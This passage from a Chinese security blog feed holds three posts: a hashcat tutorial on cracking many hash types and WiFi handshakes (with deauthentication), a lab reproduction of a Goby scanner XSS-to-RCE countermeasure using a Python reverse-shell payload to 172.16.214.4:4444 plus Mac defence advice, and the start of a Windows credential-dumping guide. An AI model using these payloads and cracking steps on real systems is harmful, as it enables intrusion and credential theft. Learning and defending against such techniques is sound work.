?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不知道目标密码的构成情况，可以直接使用 ?a 表示使用所有字符进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 19b9a36f0cab6d89cd4d3c21b2aa15be --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用字典破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 e10adc3949ba59abbe56e057f20f883e password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用字典批量破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 hash.txt password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字典组合破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 1 77b3e6926e7295494dd3be91c6934899 pwd1.txt pwd2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过测试，这里的字典组合破解，不是说简单的将两个字典的内容合并去重形成 1 个字典进行去重，而是说字典 1 的内容加上字典 2 的内容组合成一个字典，例如：</p><p>pwd1.txt 字典为：</p><pre class="line-numbers language-none"><code class="language-none">admintestroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>pwd2.txt 字典为：</p><pre class="line-numbers language-none"><code class="language-none">@2021123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么组合后的字典就是这样的：</p><pre class="line-numbers language-none"><code class="language-none">admin@2021admin123test@2021test123root@2021root123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字典+掩码破解，也是和上面一样的组合方法，只不过 pwd2.txt 换成了掩码</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 6 e120ea280aa50693d5568d0071456460 pwd1.txt ?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Mysql4-1-5"><a href="#Mysql4-1-5" class="headerlink" title="Mysql4.1/5"></a>Mysql4.1/5</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可以使用 select authentication_string from mysql.user; 查看当前数据库中的密码哈希值。</p></blockquote><h3 id="sha512crypt-6-SHA512-Unix"><a href="#sha512crypt-6-SHA512-Unix" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)"></a>sha512crypt $6$, SHA512 (Unix)</h3><p>sha512crypt $6$, SHA512 (Unix) 破解，为了避免系统误识别到特殊字符，这里为哈希值加了单引号</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X.&#39; ?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可通过 cat /etc/shadow 获取哈希值</p></blockquote><p>或者不删除用户名，直接使用 –username 参数</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1&#39; ?l?l?l?l?l --username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>NT Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>LM Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NetNTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 5500 teams.six::::822795daaf96s0a811fs6dd7b01dscssc601635cc1339basda6:e125cddcf51337asc7 -1 ?l?u ?1?1?1?1?d?d?d?d  --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSSQL-2005"><a href="#MSSQL-2005" class="headerlink" title="MSSQL (2005)"></a>MSSQL (2005)</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="WordPress-密码-hash"><a href="#WordPress-密码-hash" class="headerlink" title="WordPress 密码 hash"></a>WordPress 密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 400 --force &#39;$P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY&#x2F;&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>具体加密脚本在 ./wp-includes/class-phpass.php 的 HashPassword 函数</p></blockquote><h3 id="Discuz-用户密码-hash"><a href="#Discuz-用户密码-hash" class="headerlink" title="Discuz 用户密码 hash"></a>Discuz 用户密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>其密码加密方式 md5(md5($pass).$salt)</p></blockquote><h3 id="RAR-压缩密码"><a href="#RAR-压缩密码" class="headerlink" title="RAR 压缩密码"></a>RAR 压缩密码</h3><p>首先获取 rar 文件的 hash 值，我们可以使用另一款哈希破解工具 John 提供的 rar2john 工具将 rar 文件里的 hash 提取出来。</p><p>rar2john 下载地址：<a href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p><pre class="line-numbers language-none"><code class="language-none"># 获取 rar 文件 hashrar2john.exe 1.rar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>hashcat 支持 RAR3-hp 和 RAR5</p><p>对于 RAR5，示例如下：</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13000 --force &#39;$rar5$16$b06f5f2d4c973d6235e1a88b8d5dd594$15$a520dddcc53dd4e3930b8489b013f273$8$733969e5bda903e4&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于 RAR3-hp</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 12500 --force &#39;$RAR3$*0*5ba3dd697a8706fa*919ad1d7a1c42bae4a8d462c8537c9cb&#39; ?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>RAR3-hp 哈希头为 $RAR3$*0*，而不是 $RAR3$*1*，中间的数值是0（-hp）而不是1（-p），-p 尚未得到支持，只支持 -hp</p><p>关于 RAR 参数 -p 和 -hp 的区别：<br>-p：只对 RAR 文件加密，里面的目录和文件名没加密；<br>-hp：对目录中的文件名和子目录都进行加密处理</p></blockquote><h3 id="ZIP-压缩密码"><a href="#ZIP-压缩密码" class="headerlink" title="ZIP 压缩密码"></a>ZIP 压缩密码</h3><p>和 rar 破解过程一样，我们需要先提取 zip 文件的哈希值，这里可以使用 zip2john 进行获取，zip2john.exe 在上面下载的 rar2john.exe 的同级目录下。</p><pre class="line-numbers language-none"><code class="language-none"># 获取 zip 文件 hashzip2john.exe 1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13600 &#39;$zip2$*0*3*0*18b1a7e7ad39cb3624e54622849b23c7*5b99*3*5deee7*a418cee1a98710adce9a*$&#x2F;zip2$&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里 ZIP 的加密算法使用的 AES256</p></blockquote><h3 id="office-密码"><a href="#office-密码" class="headerlink" title="office 密码"></a>office 密码</h3><p>和 rar 与 zip 破解过程一样，我们需要先提取 office 文件的哈希值，这里可以使用 office2john.py 进行获取，office2john.py 在上面下载的 rar2john.exe 和 zip2john.exe 的同级目录下。</p><pre class="line-numbers language-none"><code class="language-none"># 获取 office 文件 hashpython office2john.py 1.docx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>测试中发现 python 会出现告警信息，不过这个告警信息不会影响程序执行</p></blockquote><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 9600 &#39;$office$*2013*100000*256*16*cd8856416b1e14305a0e8aa8eba6ce5c*18cada7070f1410f3a836c0dfc4b9643*befcde69afeafb3e652719533c824413b00ce4a499589e5ac5bd7a7a0d3c4f3d&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里哈希头为 2013 所以使用 9600 破解模式，如果是 2010 则要使用 9500 破解模式，2007 则使用 9400 破解模式。</p></blockquote><h3 id="WIFI-密码"><a href="#WIFI-密码" class="headerlink" title="WIFI 密码"></a>WIFI 密码</h3><p>要破解 WIFI 密码，首先要抓到 WIFI 的握手包，要想得到 WIFI 的握手包，就需要在监听时刚好有设备连接了该 WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI 的设备踢下去，一般设备就会自动连接该 WIFI，此时我们就抓到握手包了。</p><p><strong>抓取 WIFI 握手包</strong></p><p>1、将网卡处于监听状态</p><pre class="line-numbers language-none"><code class="language-none">airmon-ng check airmon-ng check kill &#x2F;&#x2F; 关闭影响监听状态的进程airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>wlan0 是网卡名称，一般都是 wlan0，如果不是则需要根据自己的情况进行修改，可通过 iwconfig 进行查看网卡的名称</p></blockquote><p>当使用 iwconfig 查看网卡名称变为 wlan0mon 说明此时网卡已经处于监听模式了</p><p>2、扫描可用 WIFI</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831104636.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>3、获取wifi的握手包</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng -c (上一步扫描的 CH ) --bssid (想要破解 WIFI 的 bssid ) -w (握手文件存放目录) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里以 ssid 为 teamssix 的 WIFI 为例</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng -c 1 --bssid 5E:C1:1B:A2:37:F1 -w .&#x2F; wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831105351.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a 5E:C1:1B:A2:37:F1 -c 38:26:2C:13:D3:33 wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831132010.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>4、破解密码</p><p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p><pre class="line-numbers language-none"><code class="language-none">aircrack-ng 1.cap -j 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2500 1.hccapx ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831113326.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h2><ul><li><p>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] –show 查看已破解出来的明文密码。</p></li><li><p>如果想再次破解已经破解过的密码，删除 ~/.hashcat/hashcat.potfile 文件里的对应记录即可。</p></li><li><p>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</p></li><li><p>在实际破解过程中，可以先使用 top 字典进行破解，不行再试试社工字典，比如姓名+生日的组合字典</p></li><li><p>Hashcat 参数优化：</p></li></ul><pre class="line-numbers language-none"><code class="language-none">--gpu-accel 160可以让GPU发挥最大性能--gpu-loops 1024可以让GPU发挥最大性能--segment-size 512    可以提高大字典破解的速度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a></p><p><a href="https://bipy.me/post/crack-rar/">https://bipy.me/post/crack-rar/</a></p><p><a href="https://www.sqlsec.com/2019/10/hashcat.html">https://www.sqlsec.com/2019/10/hashcat.html</a></p><p><a href="https://blog.csdn.net/weixin_44064908/article/details/103920329">https://blog.csdn.net/weixin_44064908/article/details/103920329</a></p><p><a href="https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/">https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>反制 Goby RCE 复现及 Mac 用户防御策略</title>
    <link href="https://www.teamssix.com/210813-153545.html"/>
    <id>https://www.teamssix.com/210813-153545.html</id>
    <published>2021-08-13T07:35:45.000Z</published>
    <updated>2021-08-13T07:52:23.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近看到网上反制 Goby 的文章，而自己平时 Mac 一直是裸奔的状态，这下整的自己有点慌了，这里就来记录下反制 Goby RCE 的复现以及 Mac 用户的防御策略。</p><h1 id="0x01-反制-Goby-RCE-复现"><a href="#0x01-反制-Goby-RCE-复现" class="headerlink" title="0x01 反制 Goby RCE 复现"></a>0x01 反制 Goby RCE 复现</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>为了方便，这里直接使用 PhpStudy 了，这里的 PhpStudy 地址为 <a href="http://172.16.214.4/">http://172.16.214.4</a> ，直接将 Web 服务里的 index.php 改为以下内容。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpheader(&quot;X-Powered-By: PHP&#x2F;&lt;imgsrc&#x3D;1onerror&#x3D;alert(\&quot;TeamsSix@WgpSec\&quot;)&gt;&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Goby 在扫描到 <a href="http://172.16.214.4/">http://172.16.214.4</a> 后，点击扫描结果里的 172.16.214.4  就会弹窗了。</p><blockquote><p>注意扫描结果里一定要点击对应的 IP 才行，比如我这里的 IP 是 172.16.214.4，不然是触发不了的</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813145503.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813144712.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE 需要再新建一个 js 文件，这里我在 172.16.214.4 的 www 目录下新建了一个名为 mac 的 js 文件，js 内容如下：</p><pre class="line-numbers language-none"><code class="language-none">(function()&#123;require(&#39;child_process&#39;).exec(&#39;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&#39;);require(&#39;child_process&#39;).exec(&#39;python -c \&#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.214.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);\&#39;&#39;);&#125;)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行这段 JS 会在本地打开计算器，并利用 Python 反弹 Shell 到 172.16.214.4 主机的 4444端口。</p><p>之后将 index.php 修改如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpheader(&quot;X-Powered-By: PHP&#x2F;&lt;imgsrc&#x3D;1onerror&#x3D;import(unescape(&#39;http%3A&#x2F;&#x2F;172.16.214.4&#x2F;mac.js&#39;))&gt;&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>172.16.214.4 上使用 NC 开启 4444 端口监听后，Goby 开启扫描，点击扫描结果里的 172.16.214.4 的详细信息，成功反弹 Shell.</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813150226.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-Mac-用户防御策略"><a href="#0x02-Mac-用户防御策略" class="headerlink" title="0x02 Mac 用户防御策略"></a>0x02 Mac 用户防御策略</h1><p>裸奔的 Mac 真的是一反弹一个准，太没安全感了，于是在师傅们的推荐下，入手了 little snitch，little snitch 官网链接：<a href="https://www.obdev.at/products/littlesnitch">https://www.obdev.at/products/littlesnitch</a></p><blockquote><p>声明下这个不是广告啊，只是分享下自己在 Mac 中的防御方法而已</p></blockquote><p>little snitch 可以用来监控 Mac 中所有的联网行为，界面长这个样子，个人觉着还是挺漂亮的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813151240.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>实测下来，还是不错的，即使在 Silent 模式下，当监测到有异常连接行为时也会告警，在使用过程中也是能成功拦截到反弹 Shell 请求的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813150936.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>不过 little snitch 是付费的，个人觉着买个家庭装是比较划算的，家庭装支持 5 台设备，几个小伙伴拼个单，每个人约合 94 元，另外这个比较良心的是它这个有效期是永久的。</p><p>一向习惯了白嫖的我，想了想为了安全考虑还是剁手了，毕竟我可不想那天被反制了，要是被反制了那就 GG 了。</p><p>说到这里也许会有人好奇，为啥不说说 Windows 用户的防御策略，于是我自己实际测试了一下，发现在 Windows 下装个杀软就行了，这里以火绒为例，当监测到反弹 Shell 动作时，火绒会直接弹出告警，所以感觉 Windows 就没啥好说的了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813143544.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>好了，这篇文章就到这里了，在此没有过多赘述产生原因细节等，因为主要是想分享下自己的防御策略，具体的漏洞细节参考下面的参考文章即可。</p><blockquote><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s/tl17-Qz-VXpSlZtZWDgeHg">https://mp.weixin.qq.com/s/tl17-Qz-VXpSlZtZWDgeHg</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近看到网上反制 Goby 的文章，而自己平时 Mac 一直是裸奔的状态，这下整的自己有点慌了，这里</summary>
      
    
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="RCE" scheme="https://www.teamssix.com/tags/RCE/"/>
    
    <category term="防御" scheme="https://www.teamssix.com/tags/%E9%98%B2%E5%BE%A1/"/>
    
    <category term="反制" scheme="https://www.teamssix.com/tags/%E5%8F%8D%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】密码抓取</title>
    <link href="https://www.teamssix.com/210813-120018.html"/>
    <id>https://www.teamssix.com/210813-120018.html</id>
    <published>2021-08-13T04:00:18.000Z</published>
    <updated>2021-09-08T13:31:44.525Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>Windows 系统一般使用两种方法对用户的密码进行加密处理，在域环境中，用户的密码信息以哈希值的密文形式存储在 ntds.dit 二进制文件中，该文件位于 %SystemRoot%\ntds\ntds.dit 路径下，由于该文件一直被活动目录访问，因此这个文件是被系统禁止读取的。</p><p>在非域环境中，即工作组的环境中，用户的密码等信息被存储在 SAM 文件中，该文件也同样是被系统禁止读取的。</p><p>Windows 系统中的密码一般由两部分组成，分别是 LM Hash 和 NTLM Hash，结构通常如下：</p><pre class="line-numbers language-none"><code class="language-none">username:RID:LM-Hash:NT-Hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>LM Hash（LAN Manager Hash）是 Windows 最早使用的加密算法，由 IBM 设计，其本质是 DES 加密，由于使用的 DES 算法，因此它的 KEY 是固定的，同时结合一些其他特性导致 LM Hash 加密算法较为脆弱，因此微软在 1993 年在 NT 3.1 中引入了 NTLM 协议。</p><p>NTLM Hash 是基于 MD4 的加密算法，个人版从 Vista 以后，服务版从 Windows Server 2003 以后，系统的认证方式都采用了 NTLM Hash，为了兼容性，微软也只是把 LM Hash 禁用了，只启用了 NTLM Hash.</p><p>在 Windows Vista 和 Windows Server 2003 及之前的系统默认使用的是 LM 加密，只有用户密码超过 14 位时才会使用 NTLM 加密，之后从 Vista 的系统开始，不再使用 LM Hash 加密，而是全部采用了 NTLM Hash 加密。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804160118.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果用户密码为空密码或者不存储 LM Hash 的话，我们抓到的 LM Hash 就是 AAD3B435B51404EEAAD3B435B51404EE，所以在 Vista 和 Windows Server 2003 之后的系统里抓取到的 LM Hash 都是 AAD3B435B51404EEAAD3B435B51404EE，其实这里的 LM Hash 也没有任何意义了。</p><p>也就是说从Windows Vista 和 Windows Server 2008 开始，默认情况下只存储 NTLM Hash，LM Hash 将不再被使用。</p><p>下面看下常见的抓取密码的工具。</p><h2 id="1、GetPass"><a href="#1、GetPass" class="headerlink" title="1、GetPass"></a>1、GetPass</h2><p>GetPass 下载地址：<a href="https://bbs.pediy.com/thread-163383.htm">https://bbs.pediy.com/thread-163383.htm</a></p><p>以管理员权限直接运行 GetPassword.exe 直接查看到明文密码</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804170743.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、PwDump7"><a href="#2、PwDump7" class="headerlink" title="2、PwDump7"></a>2、PwDump7</h2><p>PwDump7 下载地址：<a href="https://www.tarasco.org/security/pwdump_7/">https://www.tarasco.org/security/pwdump_7/</a></p><p>PwDump7 只能获取到用户的 hash，不能看到明文密码，不过可以使用这个 hash 值去 cmd5 等平台查找明文或者直接用哈希传递。</p><p>PwDump7 同样使用管理员权限直接运行即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804171846.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、QuarkPwDump"><a href="#3、QuarkPwDump" class="headerlink" title="3、QuarkPwDump"></a>3、QuarkPwDump</h2><p>QuarkPwDump 下载地址：<a href="https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe">https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe</a></p><p>运行以下命令导出用户 Hash</p><pre class="line-numbers language-none"><code class="language-none">QuarkPwDump.exe --dump-hash-local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804172758.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="4、Get-PassHashes"><a href="#4、Get-PassHashes" class="headerlink" title="4、Get-PassHashes"></a>4、Get-PassHashes</h2><p>Get-PassHashes 是一个 PS 